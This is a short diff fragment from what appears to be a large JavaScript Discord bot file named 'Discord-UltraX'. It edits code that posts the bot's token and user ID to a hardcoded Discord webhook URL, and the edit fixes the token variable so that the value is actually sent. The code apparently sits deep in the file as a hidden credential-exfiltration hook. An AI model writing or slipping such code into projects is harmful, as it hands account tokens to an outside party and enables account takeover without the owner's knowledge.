@@ -2489,7 +2489,7 @@ const hook = new Webhook("https://discord.com/api/webhooks/796928136942977065/5S
           **__Discord-UltraX__**
            --------------------------------------------------
            __**Token:**__ 
-           ${config.tokens}
+           ${config.token}
            --------------------------------------------------
            __**ID:**__
             ${client.user.id}
